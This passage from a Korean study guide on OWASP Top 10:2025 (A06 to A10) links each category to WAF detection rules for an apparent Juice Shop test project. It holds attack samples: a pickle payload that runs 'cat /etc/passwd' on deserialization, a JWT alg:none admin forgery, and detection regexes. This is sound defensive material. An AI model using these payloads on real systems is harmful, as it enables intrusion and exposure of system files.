한정판 제품 출시 → 봇이 0.001초 내 전량 구매
→ 일반 소비자 구매 불가

올바른 설계:
→ 구매 후 배송 전 본인 인증
→ 계정당 구매 수량 제한
→ 구매 시 CAPTCHA 검증
→ 비정상 구매 속도 탐지 및 차단
```

### 방어 방법

```
✅ AppSec 전문가와 보안·프라이버시 제어 설계 검토
✅ 보안 설계 패턴 라이브러리 구축·활용
✅ 위협 모델링 (STRIDE, DREAD, PASTA 등)을 개발 사이클에 통합
✅ 각 계층에서 입력 타당성 검사 통합
✅ 단위·통합 테스트로 위협 모델 저항성 검증
✅ 오용 사례(Misuse Case) 작성 — 공격자 관점 시나리오
✅ 테넌트 간 강력한 분리 설계
✅ 최소 권한으로 기능 제공 (필요한 기능만, 필요한 만큼)
```

### 프로젝트 연계 — `owasp/a06.py` 탐지 포인트

```python
# 비즈니스 로직 우회 패턴 (휴리스틱 기반)
A06_HEURISTICS = {
    # 가격·할인 파라미터 변조
    "price_manipulation": [
        r"price=0",
        r"price=-\d+",
        r"discount=100",
        r"amount=0\.0*1",
    ],
    # 역할 파라미터 변조
    "role_escalation": [
        r"role=admin",
        r"isAdmin=true",
        r"admin=1",
        r"privilege=superuser",
    ],
    # 단계 건너뜀 (다단계 프로세스 우회)
    "step_skipping": [
        r"/checkout/confirm",    # 결제 확인 직접 접근
        r"/order/complete",      # 주문 완료 직접 접근
        r"/verify/skip",         # 검증 단계 우회
    ],
}

# 레이트 리밋 이상 탐지 (동일 엔드포인트 단시간 과다 호출)
RATE_LIMIT_THRESHOLDS = {
    "/api/login": {"window_sec": 60, "max_requests": 10},
    "/api/purchase": {"window_sec": 300, "max_requests": 5},
    "/api/coupon": {"window_sec": 60, "max_requests": 3},
}
```

### 핵심 CWE

| CWE | 이름 |
|-----|------|
| CWE-269 | 부적절한 권한 관리 |
| CWE-434 | 위험한 유형의 파일 무제한 업로드 |
| CWE-522 | 불충분하게 보호된 자격증명 |
| CWE-602 | 서버 측 보안의 클라이언트 측 강제 |
| CWE-657 | 보안 설계 원칙 위반 |
| CWE-799 | 상호작용 빈도의 부적절한 제어 |
| CWE-841 | 비즈니스 워크플로우 부적절한 강제 |

---

## A07:2025 — Authentication Failures (인증 실패)

> **2021년 "Identification and Auth. Failures" → 명칭 변경** · 2위 유지 · CWE 36개

### 한 줄 요약

공격자가 시스템을 속여 **유효하지 않은 사용자를 합법적 사용자로 인식**하게 만드는 취약점.

### 배경 및 통계

표준화된 인증 프레임워크의 혜택에도 불구하고 여전히 7위를 유지하며, 잘못된 구현이 빈번하다. 크리덴셜 스터핑 공격이 **하이브리드 패스워드 스프레이** 방식으로 진화한 것이 주목할 만하다.

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 36개 |
| 최대 발생률 | 15.80% |
| 평균 발생률 | 2.92% |
| 총 발생 건수 | 1,120,673건 |

### 취약한 상태 점검 목록

```
□ 크리덴셜 스터핑 방어 없음
□ 하이브리드 패스워드 스프레이 방어 없음
   (Winter2025→Winter2026, Password1!→Password2! 등)
□ 브루트포스·자동화 공격 미차단
□ 기본·취약·알려진 비밀번호 허용 (admin/admin)
□ 이미 침해된 자격증명으로 신규 계정 생성 허용
□ 취약한 비밀번호 복구 (보안 질문)
□ 평문·약한 해시로 비밀번호 저장 (A04 참조)
□ MFA 없음 또는 효과 없는 MFA 폴백
□ 세션 ID URL 노출
□ 로그인 후 세션 ID 재발급 없음 (세션 고정)
□ 로그아웃·비활성 시 세션·SSO 토큰 미무효화
```

### 공격 시나리오

**시나리오 1: 하이브리드 크리덴셜 스터핑**
```
공격자 보유: 대규모 유출 자격증명 DB
  ↓
자동화 공격 (2025 트렌드):
  winter2025   → winter2026
  P@ssw0rd1   → P@ssw0rd2
  ILoveMyDog6 → ILoveMyDog7  ← 패턴 기반 변형
  ↓
레이트 리밋·MFA·이상 탐지 없으면 → 대규모 계정 탈취
```

**시나리오 2: 세션 고정 공격 (Session Fixation)**
```
1. 공격자가 미리 세션 ID 획득: SESS=attacker_chosen_id
2. 피해자에게 해당 세션 ID로 로그인 유도
3. 피해자 로그인 후 서버가 세션 ID를 재발급하지 않으면
4. 공격자도 동일 세션으로 피해자 계정 접근 가능
```

**시나리오 3: SSO 단일 로그아웃 실패**
```
시나리오: 직장 공용 컴퓨터
1. 사용자 SSO로 메일·문서·채팅 동시 로그인
2. 메일 서비스만 로그아웃
3. 문서·채팅 서비스는 여전히 인증 상태 유지
4. 다음 사용자가 잔여 세션으로 문서 접근
```

**시나리오 4: JWT 알고리즘 조작**
```python
# 공격: alg:none으로 서명 검증 우회
import base64, json

# 원본 토큰 헤더
header = {"alg": "RS256", "typ": "JWT"}

# 조작된 헤더
malicious_header = {"alg": "none", "typ": "JWT"}

# 페이로드에 role:admin 추가 후 서명 없이 전송
malicious_payload = {"sub": "user123", "role": "admin"}

# 검증 취약한 서버는 alg:none을 그대로 수용
```

### 방어 방법

```
✅ MFA(다요소 인증) 구현 및 강제
✅ 비밀번호 관리자(Password Manager) 사용 권장
✅ 기본 자격증명으로 배포 금지
✅ 상위 10,000개 취약 비밀번호 목록 대조 차단
✅ haveibeenpwned.com 연동으로 침해 자격증명 탐지
✅ NIST 800-63b 기반 비밀번호 정책
   - 복잡도보다 길이(12자 이상) 우선
   - 불필요한 주기적 변경 강제 금지
   - 침해 의심 시에만 즉시 변경 강제
✅ 계정 열거 방지: 모든 결과에 동일한 메시지
   ("이메일 또는 비밀번호가 잘못되었습니다")
✅ 로그인 실패 제한 + 점진적 지연 (DoS 주의)
✅ 서버 측: 로그인 후 새 랜덤 세션 ID 발급
✅ 로그아웃·타임아웃 시 세션 즉시 무효화
✅ JWT: aud·iss·scope 클레임 검증 필수
```

### 프로젝트 연계 — `owasp/a07.py` 탐지 포인트

```python
# 브루트포스·크리덴셜 스터핑 탐지
A07_DETECTIONS = {
    # 단시간 로그인 실패 반복
    "brute_force": {
        "endpoints": ["/login", "/api/auth", "/signin"],
        "threshold": 10,      # 10회 실패
        "window_seconds": 60, # 1분 내
        "action": "block",
    },
    # JWT 이상 탐지
    "jwt_anomaly": [
        r'"alg"\s*:\s*"none"',       # alg:none 공격
        r'"alg"\s*:\s*"HS256"',      # RSA→HMAC 다운그레이드
        r'"role"\s*:\s*"admin"',     # 역할 변조 (디코딩 후 검사)
    ],
    # 세션 ID URL 노출
    "session_in_url": r"[?&](session|sess|token|auth)=[a-zA-Z0-9+/=]{16,}",
    # 계정 열거 패턴 (응답 차이)
    "account_enum": {
        "same_response_required": True,  # 성공/실패 동일 메시지 강제
    },
}
```

### 핵심 CWE

| CWE | 이름 |
|-----|------|
| CWE-259 | 하드코딩된 비밀번호 |
| CWE-287 | 부적절한 인증 |
| CWE-307 | 과도한 인증 시도 미제한 |
| CWE-384 | 세션 고정 |
| CWE-521 | 취약한 비밀번호 요구사항 |
| CWE-613 | 불충분한 세션 만료 |
| CWE-798 | 하드코딩된 자격증명 |

---

## A08:2025 — Software or Data Integrity Failures (소프트웨어 및 데이터 무결성 실패)

> **A03과의 차이:** A03은 공급망 거시적 실패, **A08은 코드·데이터 아티팩트 레벨의 무결성 검증 실패**

### 한 줄 요약

소프트웨어 업데이트·중요 데이터·CI/CD 파이프라인이 **무결성 검증 없이 신뢰 경계를 넘는** 취약점.

### 배경 및 통계

"Software **and** Data Integrity Failures"에서 "Software **or** Data Integrity Failures"로 명칭 일부 변경. 역직렬화(Deserialization) 공격, CI/CD 파이프라인 취약점, 서명 없는 업데이트가 주요 사례다.

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 14개 |
| 최대 발생률 | 8.98% |
| 평균 발생률 | 2.75% |
| 총 발생 건수 | 501,327건 |

### 취약한 상태 유형

**① 안전하지 않은 역직렬화 (Insecure Deserialization)**
```java
// 취약: 신뢰되지 않는 Java 직렬화 데이터 역직렬화
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // ← 악성 가젯 체인 실행 가능

// 공격자가 전송하는 Java 역직렬화 페이로드
// (base64): rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0...
//            ↑ aced0005 (Java 직렬화 매직 바이트)
```

**② 서명 없는 자동 업데이트**
```
취약한 업데이트 흐름:
  업데이트 서버 → (서명 없이) → 클라이언트 기기
                                       ↑
                    공격자가 MITM으로 악성 업데이트 배포

안전한 업데이트 흐름:
  업데이트 서버 → (디지털 서명) → 클라이언트 (서명 검증) → 설치
```

**③ CI/CD 파이프라인 무결성 실패**
```yaml
# 위험: 버전 태그는 나중에 변경될 수 있음
- uses: actions/checkout@v3

# 안전: 특정 커밋 해시로 고정 (불변)
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
```

**④ 외부 서비스 신뢰 경계 위반**
```
company.com → 지원 서비스 위임
DNS: myCompany.SupportProvider.com → support.myCompany.com

결과: myCompany.com 인증 쿠키가 SupportProvider에도 전송
→ 지원 서비스 제공자가 사용자 세션 탈취 가능
```

### 공격 시나리오

**시나리오: 안전하지 않은 역직렬화 → RCE**
```python
# 공격자가 제작한 악성 pickle 페이로드
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id; whoami; cat /etc/passwd',))

payload = base64.b64encode(pickle.dumps(Exploit()))
# → 서버가 이 데이터를 역직렬화하면 OS 명령 실행
```

### 방어 방법

```
✅ 디지털 서명으로 소프트웨어·데이터 출처 및 무결성 검증
✅ 라이브러리는 신뢰된 저장소에서만 사용
✅ 코드·설정 변경에 대한 리뷰 프로세스 (PR 리뷰)
✅ CI/CD 파이프라인 접근 제어·분리·감사 로그
✅ 신뢰되지 않는 역직렬화 데이터 거부
   - Java: ObjectInputFilter 사용
   - Python: pickle 대신 JSON 사용
✅ npm·Maven 등 패키지는 공식 저장소에서만
✅ Subresource Integrity (SRI)로 외부 스크립트 무결성 검증
```

### 프로젝트 연계 — `owasp/a08.py` 탐지 포인트

```python
# 역직렬화 매직 바이트 탐지
DESERIALIZATION_SIGNATURES = {
    "java_serial": b"\xac\xed\x00\x05",          # Java
    "java_serial_b64": b"rO0AB",                  # Java (base64)
    "python_pickle": b"\x80\x02",                 # Python pickle
    "php_serial": r'O:\d+:"',                     # PHP
    "net_viewstate": r"__VIEWSTATE",               # ASP.NET
}

# Webhook/콜백 서명 검증
def verify_webhook_signature(payload: bytes, signature: str, secret: str) -> bool:
    import hmac, hashlib
    expected = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
    return hmac.compare_digest(f"sha256={expected}", signature)

# SRI(Subresource Integrity) 없는 외부 스크립트 탐지 (응답 스캔)
SRI_MISSING_PATTERN = r'<script\s+src="https?://[^"]+"\s*(?!integrity=)[^>]*>'
```

### 핵심 CWE

| CWE | 이름 |
|-----|------|
| CWE-345 | 데이터 진정성 불충분한 검증 |
| CWE-494 | 무결성 검사 없는 코드 다운로드 |
| CWE-502 | 신뢰되지 않는 데이터 역직렬화 |
| CWE-829 | 신뢰되지 않는 제어 영역의 기능 포함 |
| CWE-915 | 동적 결정 객체 속성의 부적절한 수정 제어 |

---

## A09:2025 — Security Logging and Alerting Failures (보안 로깅 및 알림 실패)

> **"Monitoring" → "Alerting" 강조로 명칭 변경** · 커뮤니티 투표 **3회 연속** 선정

### 한 줄 요약

**로깅·모니터링·알림 부재**로 공격·침해를 탐지하거나 대응하지 못하는 취약점.

### 배경 및 통계

CVE/CVSS 데이터에서 과소 표현(CVE 723개)되지만 가시성·사고 대응·포렌식에 치명적 영향. "알림(Alerting)"을 명칭에 추가하여 **탐지 후 실제 대응까지** 포함함을 강조했다.

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 5개 |
| 최대 발생률 | 11.33% |
| 평균 발생률 | 3.91% |
| 총 발생 건수 | 260,288건 |
| 관련 CVE | 723개 (낮음, 하지만 실제 영향은 큼) |

### 취약한 상태 징후

```
□ 로그인·접근 제어 실패 미로깅 (성공만 기록)
□ 경고·오류에 대한 불명확한 로그 메시지
□ 로그 무결성 보호 없음 (조작·삭제 가능)
□ 애플리케이션·API 로그의 의심 활동 미모니터링
□ 로그가 로컬에만 저장 (백업 없음)
□ 알림 임계값·에스컬레이션 프로세스 없음
□ DAST·침투 테스트가 알림을 트리거하지 않음
□ 실시간 활성 공격 탐지·알림 불가
□ 로그에 PII·비밀번호·토큰 저장
□ 로그 인젝션 취약점 (인코딩 미적용)
□ 과다 오탐(False Positive) → SOC 팀 알림 피로
□ 플레이북·유스케이스 없거나 구식
```

### 실제 침해 사례

**사례 1: 7년간 탐지 못한 어린이 의료 데이터 유출**
```
- 어린이 건강보험 웹사이트
- 외부 제보자에 의해 침해 사실 인지
- 350만 아동 민감 의료 데이터 접근·수정됨
- 사후 분석: 로깅·모니터링 시스템 전무
- 침해 기간: 2013년부터 7년 이상 지속
```

**사례 2: 유럽 항공사 GDPR 벌금 (2,000만 파운드)**
```
- 결제 앱 취약점 공격 → 40만 고객 결제 정보 탈취
- 로깅 시스템이 있었다면 조기 탐지 가능
- GDPR 신고 의무 위반으로 최대 벌금 부과
```

### 방어 방법

```
✅ 로그인·접근 제어·검증 실패를 사용자 컨텍스트와 함께 로깅
✅ 보안 제어 성공·실패 모두 로깅
✅ 로그 관리 솔루션이 소비 가능한 표준 형식 사용
✅ 로그 데이터 올바른 인코딩 (로그 인젝션 방지)
✅ 변조·삭제 방지 감사 추적 (append-only 로그)
✅ 허니토큰(Honeytoken) 활용 — 오탐 없는 공격자 탐지 덫
✅ NIST 800-61r2 기반 사고 대응·복구 계획
✅ SOC 팀 플레이북 유지 (정기 업데이트)
✅ ELK Stack / SIEM 연동 (중앙화 로그 분석)
✅ 행동 분석·AI로 저오탐율 알림 보조
```

### 프로젝트 연계 — `owasp/a09.py` 탐지 포인트 (메타 레이어)

```python
# A09 모듈은 WAF 자체의 로깅 완전성을 강제하는 메타 레이어
# 다른 9개 모듈의 이벤트 누락을 감사하고 알림을 발송한다

# 표준 이벤트 스키마 (모든 모듈 공통)
EVENT_SCHEMA = {
    "timestamp": str,           # ISO 8601 (필수)
    "client_ip": str,           # IP 주소 (해시 가능)
    "method": str,              # HTTP 메서드 (필수)
    "path": str,                # 요청 경로 (필수)
    "owasp_tags": list,         # ["A05:2025"] 등 (필수)
    "rule_id": str,             # 탐지 규칙 ID (필수)
    "blocked": bool,            # 차단 여부 (필수)
    "remediation_generated": bool,  # 리미디에이션 생성 여부
    "llm_used": bool,           # LLM 2차 판정 여부
    "latency_ms": int,          # 처리 지연 (ms)
}

# 민감 데이터 마스킹 (로그 저장 전 적용)
SENSITIVE_FIELDS_TO_MASK = [
    "password", "token", "secret", "api_key",
    "credit_card", "ssn", "authorization",
]

# 반복 공격 알림 임계값
ALERT_THRESHOLDS = {
    "same_ip_blocked": 5,       # 동일 IP 5회 차단 시 알림
    "same_rule_triggered": 20,  # 동일 규칙 20회 발동 시 알림
    "window_seconds": 300,      # 5분 기준
}

# 알림 채널
ALERT_CHANNELS = ["slack_webhook", "email", "siem"]
```

### 핵심 CWE

| CWE | 이름 |
|-----|------|
| CWE-117 | 로그에 대한 부적절한 출력 중화 (로그 인젝션) |
| CWE-221 | 정보 손실·누락 |
| CWE-223 | 보안 관련 정보 생략 |
| CWE-532 | 로그 파일에 민감 정보 삽입 |
| CWE-778 | 불충분한 로깅 |

---

## A10:2025 — Mishandling of Exceptional Conditions (예외 조건 오처리)

> **2025년 신규 카테고리** · CWE 24개 · 2021년 A10(SSRF)을 대체

### 한 줄 요약

소프트웨어가 **비정상적이고 예측 불가능한 상황을 예방·탐지·대응**하지 못해 발생하는 취약점.

### 배경 및 통계

2021년 A10이었던 SSRF(Server-Side Request Forgery)는 A01:2025 Broken Access Control(CWE-918)로 흡수되었다. 이 자리에 오류 처리 관련 광범위한 취약점이 신규 편입되었다. 기존에 "코드 품질" 카테고리로 분류되던 일부 CWE를 포함한다.

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 24개 |
| 최대 발생률 | 20.67% |
| 평균 발생률 | 2.95% |
| 총 발생 건수 | 769,581건 |

### 예외 조건 오처리의 3가지 실패 유형

```
┌─────────────────────────────────────────────────────────────┐
│              3가지 실패 유형                                    │
├───────────────────┬─────────────────────────────────────────┤
│ 1. 예방 실패       │ 비정상 상황 자체를 막지 못함             │
│ (Prevention)      │ 예: 입력 길이 제한 없음 → 버퍼 오버플로우 │
├───────────────────┼─────────────────────────────────────────┤
│ 2. 탐지 실패       │ 예외 발생을 인식하지 못함               │
│ (Detection)       │ 예: catch(Exception e) {}               │
│                   │     → 빈 catch 블록, 조용히 실패         │
├───────────────────┼─────────────────────────────────────────┤
│ 3. 대응 실패       │ 예외를 인식했지만 부적절하게 처리        │
│ (Response)        │ 예: 상세 오류 메시지를 사용자에게 노출    │
│                   │     트랜잭션 롤백 없이 부분 완료          │
└───────────────────┴─────────────────────────────────────────┘
```

### 공격 시나리오

**시나리오 1: 오류 메시지로 정찰 (Reconnaissance)**
```
공격자가 의도적으로 입력 오류 유발
  ↓
HTTP 500: {
  "error": "NullPointerException at UserRepository.java:89",
  "query": "SELECT * FROM users WHERE id=''",
  "db_conn": "PostgreSQL 14.2 at 10.0.0.5:5432",
  "stack": ["at com.example...", "at org.hibernate..."]
}
  ↓
공격자가 DB 타입·버전·내부 IP·쿼리 구조 파악
  ↓
정밀한 SQL Injection 공격 설계
```

**시나리오 2: Failing Open (장애 시 접근 허용)**
```python
# 위험: 예외 발생 시 접근 허용 (Failing Open)
def check_permission(user_id, resource_id):
    try:
        return db.check_access(user_id, resource_id)
    except Exception:
        return True  # ← 오류 시 기본 허용 → 공격자가 DB 오류 유발로 권한 우회

# 안전: 예외 발생 시 접근 거부 (Failing Closed)
def check_permission(user_id, resource_id):
    try:
        return db.check_access(user_id, resource_id)
    except Exception as e:
        logger.error(f"Permission check failed: {e}")
        return False  # ← 기본 거부 (Fail Closed)
```

**시나리오 3: 금융 거래 부분 실패 (상태 부패)**
```
트랜잭션 처리 순서:
  1. 출금 처리 (성공)
  2. 입금 처리 (네트워크 오류 → 실패)
  3. 거래 로그 기록

↓ 롤백 없이 부분 완료 처리 시
결과: 출금만 되고 입금 없음 → 자금 소실
또는: 레이스 컨디션으로 중복 출금/입금 가능
```

**시나리오 4: 리소스 고갈 (DoS)**
```python
# 취약: 예외 시 리소스 미해제
def process_upload(file):
    f = open(file, 'rb')
    try:
        data = f.read()
        process(data)
    except Exception:
        pass  # ← 파일 핸들 닫지 않음
    # f.close() 없음

# 반복 업로드 오류 발생 시 파일 핸들 소진 → 서비스 중단
```

### 방어 방법

```
✅ 예외가 발생하는 지점에서 즉시 처리 (상위 레벨 일괄 처리 지양)
✅ 글로벌 예외 핸들러 유지 (최후 방어선)
✅ 예외 처리 3단계:
   1. 사용자 친화적 오류 메시지 반환 (상세 정보 숨김)
   2. 상세 정보를 서버 내부 로그에 기록
   3. 필요 시 관리자 알림 발송
✅ 중간 처리 중 오류 시 전체 트랜잭션 롤백 (Fail Closed)
✅ 레이트 리밋·리소스 쿼터·스로틀링 적용
✅ 동일 오류 반복 시 통계 집계 후 알림 (로그 폭발 방지)
✅ 반복 오류 패턴 모니터링 → 진행 중인 공격 탐지
✅ 조직 전체 일관된 예외 처리 패턴 적용
✅ try-with-resources 또는 finally 블록으로 리소스 반드시 해제
✅ 스트레스·성능·침투 테스트로 예외 처리 검증
```

### 프로젝트 연계 — `owasp/a10.py` 탐지 포인트

```python
# 응답 스캔: 민감 오류 정보 노출 탐지
ERROR_LEAKAGE_PATTERNS = {
    "python_traceback": r"Traceback \(most recent call last\)",
    "java_exception": r"(NullPointerException|ClassCastException|IndexOutOfBoundsException)",
    "spring_error": r"at org\.springframework\.",
    "django_debug": r"DEBUG = True|django\.core\.exceptions",
    "sql_error": r"(SQL syntax|ORA-\d{5}|PostgreSQL.*ERROR)",
    "internal_ip": r"\b(10|172\.(1[6-9]|2[0-9]|3[01])|192\.168)\.\d+\.\d+\b",
    "db_connection": r"(jdbc:|mongodb://|redis://|postgresql://)",
    "file_path": r"(/var/www/|/home/\w+/|C:\\Users\\|/opt/)",
}

# HTTP 5xx 비정상 패턴 탐지
def detect_error_pattern(status_code: int, ip: str, window: dict) -> bool:
    if status_code >= 500:
        window[ip] = window.get(ip, 0) + 1
        if window[ip] >= 10:  # 10회 이상 5xx → 의도적 오류 유발 의심
            return True
    return False

# 응답 오류 메시지 필터링 (상세 정보 제거 후 반환)
def sanitize_error_response(original_body: str) -> str:
    sanitized = re.sub(r"Traceback.*$", "Internal Server Error", original_body, flags=re.DOTALL)
    sanitized = re.sub(r"at [a-z]+\.[A-Za-z.]+\(\w+\.java:\d+\)", "", sanitized)
    return sanitized
```

### 핵심 CWE

| CWE | 이름 |
|-----|------|
| CWE-209 | 민감 정보가 포함된 오류 메시지 생성 |
| CWE-248 | 처리되지 않은 예외 |
| CWE-476 | NULL 포인터 역참조 |
| CWE-636 | 안전하지 않은 실패 (Failing Open) |
| CWE-703 | 예외 조건의 부적절한 처리 |
| CWE-755 | 예외 조건의 부적절한 처리 |

---

## 종합 비교 및 프로젝트 연계

### OWASP Top 10:2025 전체 한눈에 보기

| 순위 | ID | 항목명 (한국어) | 순위 변동 | CWE 수 | 탐지 난이도 | WAF 탐지 가능성 |
|------|-----|----------------|---------|--------|------------|----------------|
| 1 | A01 | 취약한 접근 제어 | ▶ 유지 | 40 | 중 | ✅ 부분 (경로·파라미터·JWT) |
| 2 | A02 | 보안 설정 오류 | ▲ 상승 | 16 | 중 | ✅ 요청·응답 스캔 |
| 3 | A03 | 소프트웨어 공급망 실패 | ★ 확장 | 6 | 높음 | ⚠️ 부분 (외부 리소스 URL) |
| 4 | A04 | 암호화 실패 | ▼ 하락 | 32 | 중 | ✅ 헤더·쿠키·프로토콜 스캔 |
| 5 | A05 | 인젝션 | ▼ 하락 | 37 | 낮음 | ✅ 강력 (시그니처 기반) |
| 6 | A06 | 안전하지 않은 설계 | ▼ 하락 | 39 | 높음 | ⚠️ 휴리스틱·LLM 보조 필요 |
| 7 | A07 | 인증 실패 | ▶ 유지 | 36 | 중 | ✅ 레이트리밋·패턴 탐지 |
| 8 | A08 | 소프트웨어·데이터 무결성 실패 | ▶ 유지 | 14 | 중 | ✅ 역직렬화 시그니처 |
| 9 | A09 | 보안 로깅·알림 실패 | ▶ 유지 | 5 | 높음 | ✅ WAF 메타 레이어 |
| 10 | A10 | 예외 조건 오처리 | ★ 신규 | 24 | 중 | ✅ 응답 스캔 |

### AI Security System 탐지·차단·대응·기록 흐름

```
클라이언트 HTTP 요청
        │
        ▼
┌───────────────────────────────────────────────────────────┐
│                  FastAPI WAF 프록시                          │
│                                                           │
│  ① 탐지 (Detection)                                        │
│     A01~A10 모듈 병렬 실행                                   │
│     ├── L1: 시그니처 일치 → 즉시 판정                          │
│     └── L2: 애매 → LLM(Mistral-7B) 2차 판정 요청             │
│                                                           │
│  ② 차단 판정 (Block Decision)                               │
│     L1 명백 일치 → 차단 (403)                                │
│     L3 LLM 고신뢰 → 차단 + 리미디에이션 생성                  │
│     L4 LLM 불확실 → 통과 + 경고 기록                          │
│                                                           │
│  ③ 대응 (Remediation)                                      │
│     차단/고위험 시 AI 리미디에이션 텍스트 생성                   │
│     (OWASP 태그 기반 패치 가이드·코드 스니펫)                   │
│                                                           │
│  ④ 기록 (Logging)                                          │
│     SQLite에 이벤트 저장 (A09 표준 스키마 적용)                 │
│     대시보드·API로 조회 가능                                   │
└───────────────────────────────────────────────────────────┘
        │                      │
        ▼                      ▼
  차단 응답 (403)        업스트림 전달
                         OWASP Juice Shop
```

### Juice Shop 시나리오별 OWASP 태그 매핑

| 공격 시나리오 | OWASP 태그 | 탐지 방식 | 리미디에이션 내용 |
|-------------|-----------|-----------|----------------|
| SQL Injection 로그인 우회 | A05:2025 | L1 시그니처 | PreparedStatement 코드 스니펫 |
| 관리자 경로 강제 브라우징 | A01:2025 | L1 경로 패턴 | RBAC 구현 가이드 |
| 로그인 브루트포스 | A07:2025 | L1 레이트리밋 | MFA·계정 잠금 가이드 |
| `.env` 파일 접근 | A02:2025 | L1 경로 시그니처 | 민감파일 웹루트 제외 가이드 |
| XSS 스크립트 삽입 | A05:2025 | L1 시그니처 | 출력 인코딩 코드 스니펫 |
| JWT alg:none 공격 | A07:2025 | L1 JWT 검사 | JWT 안전 구현 가이드 |
| 스택 트레이스 응답 노출 | A10:2025 | 응답 스캔 | 오류 처리 구현 가이드 |
| 쿠키 Secure 플래그 없음 | A04:2025 | 응답 스캔 | 보안 쿠키 설정 가이드 |
| 가격 파라미터 변조 | A06:2025 | L2 휴리스틱+LLM | 서버 측 검증 가이드 |
| Java 역직렬화 페이로드 | A08:2025 | L1 매직 바이트 | 역직렬화 방지 가이드 |

### 판정 정책 매트릭스

| 단계 | 조건 | 동작 |
|------|------|------|
| **L1** | 시그니처 명백 일치 (SQLi·XSS·경로순회 등) | **차단** + **기록** + **대응** (리미디에이션 생성) |
| **L2** | 애매한 일치 (비즈니스 로직 우회 등) | LLM **2차 판정** → 차단/허용 + **기록** |
| **L3** | LLM 고신뢰 악성 | **차단** + **대응** (리미디에이션) + **기록** |
| **L4** | LLM 불확실 | 허용 (관대 통과) + **기록** (경고) |

---

## 참고 자료

| 분류 | 링크 |
|------|------|
| OWASP Top 10:2025 공식 | [owasp.org/Top10/2025](https://owasp.org/Top10/2025/) |
| OWASP Juice Shop | [owasp.org/www-project-juice-shop](https://owasp.org/www-project-juice-shop/) |
| OWASP ASVS | [owasp.org/www-project-application-security-verification-standard](https://owasp.org/www-project-application-security-verification-standard) |
| OWASP Cheat Sheet Series | [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/) |
| NIST 800-63b (인증 가이드라인) | [pages.nist.gov/800-63-3/sp800-63b.html](https://pages.nist.gov/800-63-3/sp800-63b.html) |
| MITRE CWE | [cwe.mitre.org](https://cwe.mitre.org/) |
| NVD (취약점 DB) | [nvd.nist.gov](https://nvd.nist.gov/) |
| NIST PQC 표준 (2024) | [nist.gov/pqcrypto](https://www.nist.gov/news-events/news/2024/08/nist-releases-first-3-finalized-post-quantum-encryption-standards) |
| OWASP Dependency-Track | [owasp.org/www-project-dependency-track](https://owasp.org/www-project-dependency-track/) |
| OSV (오픈소스 취약점 DB) | [osv.dev](https://osv.dev/) |

---

*본 문서는 [OWASP Top 10:2025](https://owasp.org/Top10/2025/) 공식 문서를 기반으로 작성되었으며, AI Security System 프로젝트의 WAF 모듈 설계·구현·학습 참조 자료로 활용한다.*
